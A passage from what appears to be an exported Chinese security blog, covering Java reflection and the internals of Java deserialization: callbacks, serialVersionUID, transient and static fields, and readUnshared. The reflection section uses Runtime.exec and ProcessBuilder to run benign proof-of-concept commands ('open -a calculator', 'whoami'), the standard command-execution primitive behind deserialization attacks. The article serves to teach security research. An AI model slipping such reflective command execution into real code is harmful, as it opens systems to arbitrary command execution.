Collections.singletonList(\n                                                &quot;open -a calculator&quot;)));\n获取私有方法\n前面已经使用过 java.lang.Class#getMethod 方法，但该方法只能获取 public 方法，上一节使用的 也是如此\n如果要获取到 private 方法，需要使用 getDeclaredConstructor/getDeclaredMethod 方法。\nClass&lt;?&gt; clazz = Class.forName(&quot;java.lang.Runtime&quot;);\n        Constructor&lt;?&gt; m = clazz.getDeclaredConstructor();\n        m.setAccessible(true);\n        clazz.getMethod(&quot;exec&quot;, String.class).invoke(m.newInstance(), &quot;open -a calculator&quot;);\n在获取 private 方法后，如果要调用它，还需要通过 setAccessible(true) 方法设置为允许访问，否则会报错。\n成员访问\n除了获取和调用方法外，反射还允许获取和修改类对象的成员。相应的方法为：\n\njava.lang.Class#getField()：根据成员名获取指定的 public 成员\njava.lang.Class#getFields()：获取所有的 public 成员\njava.lang.Class#getDeclaredField()：根据成员名获取指定的成员\njava.lang.Class#getDeclaredFields()：获取所有的成员\n\n其它的使用方式和获取方法是类似的，下面是一个示例\nClass clazz = Class.forName(&quot;java.lang.ProcessBuilder&quot;);\n        ProcessBuilder processBuilder =\n                (ProcessBuilder)\n                        clazz.getConstructor(List.class)\n                                .newInstance(\n                                        Arrays.asList(&quot;open /System/Applications/Calculator.app&quot;));\nField command = clazz.getField(&quot;command&quot;);\ncommand.setAccessible(true);\ncommand.set(processBuilder, Arrays.asList(&quot;whoami&quot;));"},"articles/security/java/roadmap/Java-安全---反序列化":{"title":"Java 安全 - 反序列化","links":[],"tags":["java","serialization"],"content":"\n如不特意说明，反序列化一律指代 Java 中的反序列化。\n\n反序列化的概念\n在前面介绍 RMI 的通信流程和攻击方法中，已经看到过 Java 反序列化的身影。\n下面具体说说，反序列化是什么，以及它为何容易引起安全问题。\n序列化与反序列化（marshal/unmarshal）是一种存储和转化数据（将数据变为内存中对象或变量，反之亦然）的方式，例如 json、xml 等文件格式，它是一种通用的标准。但它们的缺点是不支持复杂的数据结构，只有基本的数据类型，数值，字符串，布尔值等\n为例支持更复杂的内容的传输，才出现了诸如 Jackson、Fastjson、XStream 等第三方的序列化库。\n而 Java 则内置了自己的序列化与反序列化机制，它有自己定义的标准 Java Object Serialization Specification: Contents (oracle.com)。 序列化的目的主要是为了便于将程序运行时的数据以某种约定好的形式在网络中传输，从而实现一些功能，例如 RPC（Remote Procedure Call）。\n序列化容易引起安全问题的原因之一在于，序列化机制提供的动态特性，例如修改变量的值，或是执行某些方法。\nJava 反序列化\nJava 的反序列化操作，由接口 Serializable 定义，如果去 JDK 中随便找一个类（例如：HashMap），大概率都能看到两个方法，它们都来自 Serializable 接口：\n\nreadObject：将对象序列化成二进制数据\nwriteObject：将二进制数据恢复成一个对象\n\n而 Java 在序列化时，会调用对象中的 writeObject(ObjectOutputStream out) 方法，开发者可以通过编写 writeObject 方法来自定义序列化的行为，从而随意写入所需的内容；反序列化时则会调用 readObject 方法，按照 writeObject 中写入的顺序，读取内容并进行处理。\n修改默认行为\n来看个例子，有如下 CustomSerialization 类：\npublic class CustomSerialization implements java.io.Serializable {\n    public String name;\n    transient public int age;\n \n    public CustomSerialization(String name, int age) {\n        this.name = name;\n        this.age = age;\n    }\n \n    private void writeObject(ObjectOutputStream s) throws IOException {\n        s.defaultWriteObject();\n        s.writeObject(&quot;This is a object&quot;);\n    }\n \n    private void readObject(java.io.ObjectInputStream s)\n            throws IOException, ClassNotFoundException {\n        s.defaultReadObject();\n        String message = (String) s.readObject();\n        System.out.println(message);\n    }\n \n    public static void main(String[] args) {\n        try (ObjectOutputStream oos =\n                new ObjectOutputStream(Files.newOutputStream(Paths.get(&quot;target/person.bin&quot;)))) {\n            oos.writeObject(new CustomSerialization(&quot;trganda&quot;, 18));\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n其中重写了 writeObject 方法，在执行完默认的 s.defaultWriteObject()，又写入了一个字符串 &quot;This is a object&quot;。下面通过 SerializationDumper 工具查看生成的序列化数据\nSTREAM_MAGIC - 0xac ed\nSTREAM_VERSION - 0x00 05\nContents\n  TC_OBJECT - 0x73\n    TC_CLASSDESC - 0x72\n      className\n        Length - 53 - 0x00 35\n        Value - com.trganda.roadmap.serialization.CustomSerialization - 0x636f6d2e747267616e64612e726f61646d61702e73657269616c697a6174696f6e2e437573746f6d53657269616c697a6174696f6e\n      serialVersionUID - 0x6e 5d bc 20 2c b5 58 15\n      newHandle 0x00 7e 00 00\n      classDescFlags - 0x03 - SC_WRITE_METHOD | SC_SERIALIZABLE\n      fieldCount - 1 - 0x00 01\n      Fields\n        0:\n          Object - L - 0x4c\n          fieldName\n            Length - 4 - 0x00 04\n            Value - name - 0x6e616d65\n          className1\n            TC_STRING - 0x74\n              newHandle 0x00 7e 00 01\n              Length - 18 - 0x00 12\n              Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b\n      classAnnotations\n        TC_ENDBLOCKDATA - 0x78\n      superClassDesc\n        TC_NULL - 0x70\n    newHandle 0x00 7e 00 02\n    classdata\n      com.trganda.roadmap.serialization.CustomSerialization\n        values\n          name\n            (object)\n              TC_STRING - 0x74\n                newHandle 0x00 7e 00 03\n                Length - 7 - 0x00 07\n                Value - trganda - 0x747267616e6461\n        objectAnnotation\n          TC_STRING - 0x74\n            newHandle 0x00 7e 00 04\n            Length - 16 - 0x00 10\n            Value - This is a object - 0x546869732069732061206f626a656374\n          TC_ENDBLOCKDATA - 0x78\n\n可以看到，额外写入的字符串 &quot;This is a object&quot; 被放在了 objectAnnotation 字段，而非具体属性中。\nStatic 和 Transient\n从前面解析等内容中可以看到，成员 age 没有被写入序列化数据中，因为它被关键词 transient 修饰了，这个关键词的作用就是标记不希望被序列化的成员。\nserialVersionUID\n此外对于 static 成员，也不会被序列化。但有一个特殊的成员除外，对于每一个实现了 Serializable 接口的类而言，都有一个成员 serialVersionUID，通常标记为 static final long。\n虽然标记为 static，但它默认会被序列化，该成员的一大作用是在反序列化时，JVM 会检查 serialVersionUID 和本地对应类的 serialVersionUID 是否相同，不同则表示不兼容从而抛出异常终止反序列化过程。\n写个 Demo 实验一下\npublic class VersionUIDSerialization implements java.io.Serializable {\n    public String name;\n    public transient int age;\n    public static String bio = &quot;This is a bio&quot;;\n    private static final long serialVersionUID = 1111111111111111111L;\n \n\t// 其它方法不变...\n \n\tpublic static void main(String[] args) {\n\t\ttry (ObjectOutputStream oos =\n\t\t\t\tnew ObjectOutputStream(Files.newOutputStream(Paths.get(&quot;target/person.bin&quot;)))) {\n\t\t\tCustomSerialization2 customSerialization2 = new CustomSerialization2(&quot;Trganda&quot;, 25);\n\t\t\tCustomSerialization2.bio = &quot;This is a new bio&quot;;\n\t\t\toos.writeObject(customSerialization2);\n\t\t} catch (IOException e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t}\n}\n \n// StaticSerialization.java 需要在另一个类中进行反序列化\npublic class StaticSerialization {\n    public static void main(String[] args) {\n        try (ObjectInputStream ois =\n                new ObjectInputStream(Files.newInputStream(Paths.get(&quot;target/person.bin&quot;)))) {\n            VersionUIDSerialization person = (VersionUIDSerialization) ois.readObject();\n            System.out.println(person);\n        } catch (IOException | ClassNotFoundException e) {\n            e.printStackTrace();\n        }\n    }\n}\n反序列化时输出的内容中，静态成员 bio 并没有被修改。\nCustomSerialization2{name=&#039;Trganda&#039;, age=25&#039;, bio=&#039;This is a bio&#039;}\n\n查看文件 target/person.bin，成员只有 name，\nhexdump -ve &#039;1/1 &quot;%.2x&quot;&#039; target/person.bin\njava -jar SerializationDumper-v1.13.jar #贴上上一步的输出结果\nSTREAM_MAGIC - 0xac ed\nSTREAM_VERSION - 0x00 05\nContents\n  TC_OBJECT - 0x73\n    TC_CLASSDESC - 0x72\n      className\n        Length - 54 - 0x00 36\n        Value - com.trganda.roadmap.serialization.VersionUIDSerialization - 0x636f6d2e747267616e64612e726f61646d61702e73657269616c697a6174696f6e2e437573746f6d53657269616c697a6174696f6e32\n      serialVersionUID - 0x0f 6b 75 ab 2b c4 71 c7\n      newHandle 0x00 7e 00 00\n      classDescFlags - 0x03 - SC_WRITE_METHOD | SC_SERIALIZABLE\n      fieldCount - 1 - 0x00 01\n      Fields\n        0:\n          Object - L - 0x4c\n          fieldName\n            Length - 4 - 0x00 04\n            Value - name - 0x6e616d65\n\n现在尝试先修改一下 CustomSerialization2 的 serialVersionUID=1111111111111111112L ，再执行 StaticSerialization\nmvn exec:java -Dexec.mainClass=&quot;com.trganda.roadmap.serialization.StaticSerialization&quot;\n则会抛出如下异常\njava.io.InvalidClassException: com.trganda.roadmap.serialization.VersionUIDSerialization; local class incompatible: stream classdesc serialVersionUID = 1111111111111111111, local class serialVersionUID = 1111111111111111112\n\tat java.io.ObjectStreamClass.initNonProxy(ObjectStreamClass.java:699)\n\tat java.io.ObjectInputStream.readNonProxyDesc(ObjectInputStream.java:2005)\n\tat java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1852)\n\tat java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2186)\n\tat java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1669)\n\tat java.io.ObjectInputStream.readObject(ObjectInputStream.java:503)\n\tat java.io.ObjectInputStream.readObject(ObjectInputStream.java:461)\n\tat com.trganda.roadmap.serialization.StaticSerialization.main(StaticSerialization.java:12)\n\n强行序列化 Static 和 Transient 成员\n如果非要序列化 static 和 transient 成员呢？Java 的序列化机制可以做到这一点，你需要在类中添加一个类型为 ObjectStreamField 的成员 serialPersistentFields\npublic class FieldSerialization implements Serializable {\n    public String name;\n    public transient int age;\n    public static String bio = &quot;This is a bio&quot;;\n\tprivate static final ObjectStreamField[] serialPersistentFields = {\n        new ObjectStreamField(&quot;age&quot;, int.class)\n    };\n \n    public FieldSerialization(String name, int age) {\n        this.name = name;\n        this.age = age;\n    }\n \n    public static void main(String[] args) {\n        try (ObjectOutputStream oos =\n                new ObjectOutputStream(Files.newOutputStream(Paths.get(&quot;target/person.bin&quot;)))) {\n            FieldSerialization fieldSerialization = new FieldSerialization(&quot;Trganda&quot;, 25);\n            oos.writeObject(fieldSerialization);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n查看生成的文件，age 的内容被成功写入了，\nSTREAM_MAGIC - 0xac ed\nSTREAM_VERSION - 0x00 05\nContents\n  TC_OBJECT - 0x73\n    TC_CLASSDESC - 0x72\n      className\n        Length - 52 - 0x00 34\n        Value - com.trganda.roadmap.serialization.FieldSerialization - 0x636f6d2e747267616e64612e726f61646d61702e73657269616c697a6174696f6e2e4669656c6453657269616c697a6174696f6e\n      serialVersionUID - 0xed d3 0b 6c 2c 69 35 d7\n      newHandle 0x00 7e 00 00\n      classDescFlags - 0x02 - SC_SERIALIZABLE\n      fieldCount - 1 - 0x00 01\n      Fields\n        0:\n          Int - I - 0x49\n          fieldName\n            Length - 3 - 0x00 03\n            Value - age - 0x616765\n      classAnnotations\n        TC_ENDBLOCKDATA - 0x78\n      superClassDesc\n        TC_NULL - 0x70\n    newHandle 0x00 7e 00 01\n    classdata\n      com.trganda.roadmap.serialization.FieldSerialization\n        values\n          age\n            (int)25 - 0x00 00 00 19\n\n可如果要写入 static 成员 bio 呢？修改 serialPersistentFields\nprivate static final ObjectStreamField[] serialPersistentFields = {\n\tnew ObjectStreamField(&quot;bio&quot;, String.class)\n};\n却出现了如下异常\njava.io.InvalidClassException: com.trganda.roadmap.serialization.FieldSerialization; unmatched serializable field(s) declared\n\tat java.io.ObjectStreamClass$ExceptionInfo.newInvalidClassException(ObjectStreamClass.java:169)\n\tat java.io.ObjectStreamClass.checkDefaultSerialize(ObjectStreamClass.java:911)\n\tat java.io.ObjectOutputStream.defaultWriteFields(ObjectOutputStream.java:1527)\n\tat java.io.ObjectOutputStream.writeSerialData(ObjectOutputStream.java:1509)\n\tat java.io.ObjectOutputStream.writeOrdinaryObject(ObjectOutputStream.java:1432)\n\tat java.io.ObjectOutputStream.writeObject0(ObjectOutputStream.java:1178)\n\tat java.io.ObjectOutputStream.writeObject(ObjectOutputStream.java:348)\n\tat com.trganda.roadmap.serialization.FieldSerialization.main(FieldSerialization.java:28)\n\n跟入调用栈 ObjectStreamClass#checkDefaultSerialize，如果 defaultSerializeEx 不为空就会抛出异常\nvoid checkDefaultSerialize() throws InvalidClassException {\n\trequireInitialized();\n\tif (defaultSerializeEx != null) {\n\t\tthrow defaultSerializeEx.newInvalidClassException();\n\t}\n}\n而 defaultSerializeEx 的创建位于构造方法 ObjectStreamClass(final Class&lt;?&gt; cl)，而问题的根本原因在于 ObjectStreamClass#getDeclaredSerialFields [2]，如果成员类型是静态的则 ObjectStreamField 实例对象的 field 成员为空。\nprivate static ObjectStreamField[] getDeclaredSerialFields(Class&lt;?&gt; cl)\n        throws InvalidClassException\n    {\n\t// ...\n \n\ttry {\n\t\tField f = cl.getDeclaredField(fname);\n\t\tif ((f.getType() == spf.getType()) &amp;&amp;\n\t\t\t((f.getModifiers() &amp; Modifier.STATIC) == 0)) // [2]\n\t\t{\n\t\t\tboundFields[i] =\n\t\t\t\tnew ObjectStreamField(f, spf.isUnshared(), true);\n\t\t}\n\t} catch (NoSuchFieldException ex) {\n\t}\n总结来说就是不允许序列化静态成员。\n调用链分析\n\nserialVersionUID 的检查\n\n根据异常信息跟入 initNonProxy ，从 [1] 中看到 如果 serialVersionUID 不相等则会触发异常。\nvoid initNonProxy(ObjectStreamClass model,\n\t\t\t\t  Class&lt;?&gt; cl,\n\t\t\t\t  ClassNotFoundException resolveEx,\n\t\t\t\t  ObjectStreamClass superDesc)\n\tthrows InvalidClassException\n{\n\tlong suid = Long.valueOf(model.getSerialVersionUID());\n\tObjectStreamClass osc = null;\n\tif (cl != null) {\n\t\tosc = lookup(cl, true);\n\t\t// ...\n\t\tif (model.serializable == osc.serializable &amp;&amp;\n\t\t\t\t!cl.isArray() &amp;&amp;\n\t\t\t\tsuid != osc.getSerialVersionUID()) { // [1]\n\t\t\tthrow new InvalidClassException(osc.name,\n\t\t\t\t\t&quot;local class incompatible: &quot; +\n\t\t\t\t\t\t\t&quot;stream classdesc serialVersionUID = &quot; + suid +\n\t\t\t\t\t\t\t&quot;, local class serialVersionUID = &quot; +\n\t\t\t\t\t\t\tosc.getSerialVersionUID());\n\t\t}\nObjectStreamClass\n在前面的代码中可以看到 ObjectStreamClass 的身影，从注释中看它的作用生成序列化对象的描述符。并且可以通过静态方法 ObjectStreamClass#lookup(Class&lt;?&gt; cl) 在 JVM 中创建一个实例。\n\nSerialization’s descriptor for classes. It contains the name and serialVersionUID of the class. The ObjectStreamClass for a specific class loaded in this Java VM can be found/created using the lookup method.\n\n内部有很多成员，描述了与用于序列化的相关信息\nCustomSerialization#readObject\n如果自定义了 readObject 方法，简化的调用栈如下\nObjectInputStream.readObject\n  ObjectInputStream.readObject0\n\n    // 解析 TC_OBJECT 类型的数据\n    ObjectInputStream.readOrdinaryObject\n\n      // 从序列化数据流中读取类的描述信息 ObjectStreamClass\n      ObjectInputStream.readClassDesc\n      // 检查对应类能否序列化，对 `serialVersionUID` 的检查就在这\n      ObjectStreamClass.checkDeserialize\n\n      // 类实现了哪个接口？Externalizable 还是 Serializable\n      ObjectStreamClass.isExternalizable\n\n      // 实现的是 Serializable\n      ObjectInputStream.readSerialData\n        // 调用 readObject 方法\n\t\tObjectStreamClass.invokeReadObject\n\nObjectInputStream#resolveClass\n反序列化时是如何获取类的实例对象的？深入调用栈中的 ObjectInputStream.readClassDesc，会调用 ObjectInputStream#resolveClass 获取类的 Class 实例对象。\n在注释中有说明，它的默认实现是调用 Class.forName(desc.getName(), false, loader) 。ObjectInputStream 的子类可以重写该方法来增加类的搜寻范围。\n\nThe default implementation of this method in ObjectInputStream returns the result of calling\nClass.forName(desc.getName(), false, loader)\n\n而对象的实例化代码位于 ObjectInputStream#readOrdinaryObject 内，通过调用 newInstance 方法。\nObject obj;\ntry {\n\tobj = desc.isInstantiable() ? desc.newInstance() : null;\n} catch (Exception ex) {\n\tthrow (IOException) new InvalidClassException(\n\t\tdesc.forClass().getName(),\n\t\t&quot;unable to create instance&quot;).initCause(ex);\n}\n简化调用关系梳理\nObjectInputStream.readObject\n  ObjectInputStream.readObject0\n\n    // 解析 TC_OBJECT 类型的数据\n    ObjectInputStream.readOrdinaryObject\n\n      // 从序列化数据流中读取类的描述信息 ObjectStreamClass\n      ObjectInputStream.readClassDesc\n        ObjectInputStream.readNonProxyDesc\n          // 获取类 Class 对象，用于创建 ObjectStreamClass 对象\n          ObjectInputStream.resolveClass\n          // 初始化 ObjectStreamClass 对象，initialized 成员赋值为 true\n          ObjectStreamClass.initNonProxy\n\n      // 检查对应类能否序列化，对 `serialVersionUID` 的检查就在这\n      ObjectStreamClass.checkDeserialize\n\n      // 实例化类对象\n      ObjectStreamClass.newInstance()\n\t    // 检查初始化 initialized 成员\n\t    requireInitialized();\n        // Constructor&lt;?&gt; cons，调用 java.lang.Object Class对象的 newInstance 方法创建对象\n        cons.newInstance()\n\n      // 类实现了哪个接口？Externalizable 还是 Serializable\n      ObjectStreamClass.isExternalizable\n\n      // 实现的是 Serializable\n      ObjectInputStream.readSerialData\n        // 调用 readObject 方法\n\t\tObjectStreamClass.invokeReadObject\n\n\t  // 调用 readResolve 方法\n\t  ObjectStreamClass.invokeReadResolve(obj);\n\nSerializable 回调顺序\nSerializable 接口内可被实现的方法实际有多个\nprivate void writeObject(java.io.ObjectOutputStream out)\n      throws IOException\nprivate void readObject(java.io.ObjectInputStream in)\n      throws IOException, ClassNotFoundException;\nprivate void readObjectNoData()\n      throws ObjectStreamException;\nANY-ACCESS-MODIFIER Object writeReplace()\n      throws ObjectStreamException;\nANY-ACCESS-MODIFIER Object readResolve()\n      throws ObjectStreamException;\n\n前面接触过的只有前两个而已，写个测试代码 LifeSerialization\npublic class LifeSerialization implements Serializable {\n    public String name;\n    public int age;\n \n    public LifeSerialization(String name, int age) {\n        this.name = name;\n        this.age = age;\n    }\n \n    private void writeObject(ObjectOutputStream s) throws IOException {\n        s.defaultWriteObject();\n        System.out.println(&quot;call writeObject&quot;);\n    }\n \n    private void readObject(java.io.ObjectInputStream s)\n            throws IOException, ClassNotFoundException {\n        s.defaultReadObject();\n        System.out.println(&quot;call readObject&quot;);\n    }\n \n    private Object writeReplace() throws ObjectStreamException {\n        System.out.println(&quot;call writeReplace&quot;);\n        return new LifeSerialization(&quot;writeReplace&quot;, 18);\n    }\n \n    private Object readResolve()\n        throws ObjectStreamException {\n        System.out.println(&quot;call readResolve&quot;);\n        return new LifeSerialization(&quot;readResolve&quot;, 18);\n    }\n \n    public static void main(String[] args) {\n        try (ObjectOutputStream oos =\n                new ObjectOutputStream(Files.newOutputStream(Paths.get(&quot;target/person.bin&quot;)))) {\n            oos.writeObject(new LifeSerialization(&quot;trganda&quot;, 18));\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n \n        try (ObjectInputStream ois =\n                new ObjectInputStream(Files.newInputStream(Paths.get(&quot;target/person.bin&quot;)))) {\n            LifeSerialization life = (LifeSerialization) ois.readObject();\n            System.out.println(life);\n        } catch (IOException | ClassNotFoundException e) {\n            e.printStackTrace();\n        }\n    }\n}\n运行到结果是\ncall writeReplace\ncall writeObject\ncall readObject\ncall readResolve\nLifeSerialization{name=&#039;readResolve&#039;, age=18}\n\n可以清楚看到这 4 个方法的调用顺序，以及写入的对象在反序列化时被替换了，而 writeReplace 和 readResolve 的作用也很简单：\n\nwriteReplace 在写入内容前，替换要写入的对象，但写入的对象类型需要与当前类兼容，比如子类。触发位置在 ObjectOutputStream#writeObject0\nreadResolve 在读取内容前，替换要读取的对象，但读取的对象类型需要与当前类兼容，比如子类。触发位置在 ObjectIutputStream#readOrdinaryObject\n\nreadObjectNoData 的作用\nreadObjectNoData 应该是这几个方法中最神秘的了，在接口的注释中，有这样一段说明\n\nThe readObjectNoData method is responsible for initializing the state of the object for its particular class in the event that the serialization stream does not list the given class as a superclass of the object being deserialized. This may occur in cases where the receiving party uses a different version of the deserialized instance’s class than the sending party, and the receiver’s version extends classes that are not extended by the sender’s version. This may also occur if the serialization stream has been tampered; hence, readObjectNoData is useful for initializing deserialized objects properly despite a “hostile” or incomplete source stream.\n\n里面提到了 readObjectNoData 的使用场景\n\n反序列化的一方类的版本和序列化时的不一样\n反序列化的一方类的定义发生改变，比如被序列化的那个类在反序列化时继承了另一个类\n序列化数据有损害或者不完整\n\n听着着实有点抽象，在 StackOverflow 上找到一个示例\n首先有一个 Employee 类，对它进行序列化，\npublic class Employee implements Serializable {  // v1\n    public String name;\n    public int age;\n    protected String address;\n    static final long serialVersionUID = 1L;\n \n    public Employee() {\n        name = &quot;John&quot;;\n        age = 1;\n        address = &quot;N/A&quot;;\n    }\n \n    public Employee(String name, int age, String address) {\n        this.name = name;\n        this.age = age;\n        this.address = address;\n    }\n \n    public static void main(String[] args) {\n        Employee e = new Employee();\n \n        try {\n            FileOutputStream fileOut = new FileOutputStream(&quot;employee.bin&quot;);\n            ObjectOutputStream out = new ObjectOutputStream(fileOut);\n            out.writeObject(e);\n            out.close();\n            fileOut.close();\n            System.out.println(&quot;Serialized data is saved in tmp.txt&quot;);\n        } catch (IOException i) {\n            i.printStackTrace();\n        }\n    }\n}\n而在反序列化的一端 Employee 类的实现发生了改变，它继承了类 Person，并且在 Person 中定义了 readObjectNoData 方法\nclass Person implements Serializable {\n    protected String name;\n    protected int age;\n \n    Person() {\n        this(&quot;John&quot;, 1);\n    }\n \n    Person(String name, int age) {\n        this.name = name;\n        this.age = age;\n    }\n \n    private void readObjectNoData() throws ObjectStreamException {\n        name = &quot;John&quot;;\n        age = 1;\n        throw new IllegalArgumentException();\n    }\n}\n \npublic class Employee extends Person { // v2\n    protected String address;\n    static final long serialVersionUID = 1L;\n \n    public Employee() {\n        super();\n        address = &quot;N/A&quot;;\n    }\n \n    public Employee(String name, int age, String address) {\n        super(name, age);\n        this.address = address;\n    }\n \n    public static void main(String[] args) {\n        Employee e = null;\n        try {\n            FileInputStream fileIn = new FileInputStream(&quot;employee.bin&quot;);\n            ObjectInputStream in = new ObjectInputStream(fileIn);\n            e = (Employee) in.readObject();\n            in.close();\n            fileIn.close();\n        } catch (IOException i) {\n            i.printStackTrace();\n            System.out.println(&quot;IOException&quot;);\n            return;\n        } catch (ClassNotFoundException c) {\n            System.out.println(&quot;Employee class not found&quot;);\n            c.printStackTrace();\n            return;\n        }\n \n        System.out.println(&quot;Deserialized Employee...&quot;);\n        System.out.println(&quot;Name: &quot; + e.name);\n        System.out.println(&quot;Address: &quot; + e.address);\n        System.out.println(&quot;Age: &quot; + e.age);\n    }\n}\n运行后的结果如下 readObjectNoData 被调用。\nException in thread &quot;main&quot; java.lang.IllegalArgumentException\n\tat com.trganda.roadmap.serialization.nodata.Person.readObjectNoData(Person.java:22)\n\tat sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n\tat sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\n\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\n\tat java.lang.reflect.Method.invoke(Method.java:498)\n\tat java.io.ObjectStreamClass.invokeReadObjectNoData(ObjectStreamClass.java:1215)\n\tat java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2368)\n\tat java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2213)\n\tat java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1669)\n\tat java.io.ObjectInputStream.readObject(ObjectInputStream.java:503)\n\tat java.io.ObjectInputStream.readObject(ObjectInputStream.java:461)\n\tat com.trganda.roadmap.serialization.nodata.Employee.main(Employee.java:58)\n在序列化的过程中，写入的数据中是没有 Person 的信息的。而当反序列化时，类 Employee 虽然存在但是定义变了，并不知道该如何恢复父类 Person 的信息，此时会对成员进行默认赋值（可以注释掉 readObjectNoData 方法看看）。\n但是可以通过在 Person 中定义 readObjectNoData 方法，对 Person 对象进行修改，所以通过这个示例能够大概理解 NoData 是什么意思了，对那些反序列化时没有获取所需数据的类中进行定义才有效。\n从实现的代码中能够体会这一点，[3] 表示没有从输入流中获取到类的数据。\nprivate void readSerialData(Object obj, ObjectStreamClass desc)\n\tthrows IOException\n{\n\tObjectStreamClass.ClassDataSlot[] slots = desc.getClassDataLayout();\n\tfor (int i = 0; i &lt; slots.length; i++) {\n\t\tObjectStreamClass slotDesc = slots[i].desc;\n \n\t\tif (slots[i].hasData) {\n\t\t\t// ...\n\t\t} else { // [3]\n\t\t\tif (obj != null &amp;&amp;\n\t\t\t\tslotDesc.hasReadObjectNoDataMethod() &amp;&amp;\n\t\t\t\thandles.lookupException(passHandle) == null)\n\t\t\t{\n\t\t\t\tslotDesc.invokeReadObjectNoData(obj);\n\t\t\t}\n\t\t}\n\t}\n}\nreadObject Vs readUnshared\nJava 的序列化机制可以写入同一对象多次，但后面写入的内容会被标记为第一次写入的引用。\nCustomSerialization obj1 = new CustomSerialization(&quot;trganda&quot;, 18);\noos.writeObject(obj1);\noos.writeObject(obj1); // TC_REFERENCE\n在读取时可以连续两次调用 readObject，但第二次读入的对象也是第一次的引用，看如下代码实例\ntry (ObjectOutputStream oos =\n                new ObjectOutputStream(Files.newOutputStream(Paths.get(&quot;target/person.bin&quot;)))) {\n\tCustomSerialization obj1 = new CustomSerialization(&quot;trganda&quot;, 18);\n\toos.writeObject(obj1);\n\toos.writeObject(obj1);\n} catch (IOException e) {\n\te.printStackTrace();\n}\n \ntry (ObjectInputStream ois =\n\t\tnew ObjectInputStream(Files.newInputStream(Paths.get(&quot;target/person.bin&quot;)))) {\n\tCustomSerialization obj1 = (CustomSerialization) ois.readObject();\n\tSystem.out.println(obj1);\n\tobj1.age = 1; // [4] 对第一次读取的对象的成员属性进行修改\n\tCustomSerialization obj1ref = (CustomSerialization) ois.readObject();\n\tSystem.out.println(obj1ref);\n} catch (IOException | ClassNotFoundException e) {\n\te.printStackTrace();\n}\n输出结果如下，在第一次 readObject 后修改了属性 age 为 1，第二次 readObject 的结果也发生了改变。\nThis is a object\nCustomSerialization{name=&#039;trganda&#039;, age=18}\nCustomSerialization{name=&#039;trganda&#039;, age=1}\n\n可如果在反序列化时，不希望对象 obj1 的后续引用被读取呢？这时就可以使用 readUnshared 方法，它可以正常读取原始对象，但如果继续尝试读取『readObject 或者 readUnshared』后续的引用，则会触发异常。\n来看下面的例子\npublic static void main(String[] args) {\n\ttry (ObjectOutputStream oos =\n\t\t\tnew ObjectOutputStream(Files.newOutputStream(Paths.get(&quot;target/person.bin&quot;)))) {\n\t\tCustomSerialization obj1 = new CustomSerialization(&quot;trganda&quot;, 18);\n\t\toos.writeObject(obj1);\n\t\toos.writeObject(obj1);\n \n\t\tCustomSerialization obj2 = new CustomSerialization(&quot;trganda&quot;, 19);\n\t\toos.writeObject(obj2);\n\t} catch (IOException e) {\n\t\te.printStackTrace();\n\t}\n \n\ttry (ObjectInputStream ois =\n\t\t\tnew ObjectInputStream(Files.newInputStream(Paths.get(&quot;target/person.bin&quot;)))) {\n\t\tCustomSerialization obj1 = (CustomSerialization) ois.readUnshared();\n\t\tSystem.out.println(obj1);\n\t\tobj1.age = 1;\n\t\ttry {\n\t\t\tCustomSerialization obj1ref = (CustomSerialization) ois.readObject();\n\t\t\tSystem.out.println(obj1ref);\n\t\t} catch (InvalidObjectException e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t\tCustomSerialization obj2 = (CustomSerialization) ois.readObject();\n\t\tSystem.out.println(obj2);\n\t} catch (IOException | ClassNotFoundException e) {\n\t\te.printStackTrace();\n\t}\n}\n运行结果如下\nThis is a object\nCustomSerialization{name=&#039;trganda&#039;, age=18}\nThis is a object\nCustomSerialization{name=&#039;trganda&#039;, age=19}\njava.io.InvalidObjectException: cannot read back reference to unshared object\n\tat java.io.ObjectInputStream.readHandle(ObjectInputStream.java:1798)\n\tat java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1634)\n\tat java.io.ObjectInputStream.readObject(ObjectInputStream.java:503)\n\tat java.io.ObjectInputStream.readObject(ObjectInputStream.java:461)\n\tat com.trganda.roadmap.serialization.unshared.UnsharedSerialization.main(UnsharedSerialization.java:32)\n\n异常的原因是 readUnshared 后就把内部的 调用的是 readObject0(Object.class, true)，第二个参数表示 unshared 模式，此时读取后，内部 handles.entries 中 第 2 个 的 item 内容是空的 Object『对应 ObjectInputStream 中的 unsharedMarker = new Object()』，\n\n可以对比一下 readObject0(Object.class, false) 的结果\n\n总结来说就是 readObject 和 readUnshared 两者的区别在于后者会拒绝后续对引用对象的读取。\n补充\n前面只是简短的介绍了 Serializable 接口而已，但关于 Java 的序列化机制还有很多可以谈的东西。\n参考\n\ndocs.oracle.com/javase/8/docs/technotes/guides/serialization/index.html 『序列化指南』\ndocs.oracle.com/javase/8/docs/platform/serialization/spec/serialTOC.html 『序列化标准接口的使用教程和说明』\n\ndocs.oracle.com/javase/8/docs/platform/serialization/spec/serial-arch.html#a6250 『如何定义需要被序列化的成员』\ndocs.oracle.com/javase/8/docs/platform/serialization/spec/serial-arch.html#a5251 『javadoc 声明需要被序列化的成员』\ndocs.oracle.com/javase/8/docs/platform/serialization/spec/output.html#a5324 『writeReplace 方法，替换写入的对象』\ndocs.oracle.com/javase/8/docs/platform/serialization/spec/input.html#a5903 『readResolve 方法，替换读取的对象』\ndocs.oracle.com/javase/8/docs/platform/serialization/spec/input.html#a6053 『readObjectNoData 方法介绍』\ndocs.oracle.com/javase/8/docs/platform/serialization/spec/input.html 『ObjectInputStream 介绍』\n\n\nstackoverflow.com/questions/46481605/when-will-readobjectnodata-be-called 『readObjectNoData 方法何时会被调用』\nstackoverflow.com/questions/6429462/java-static-serialization-rules 『static 和 transient 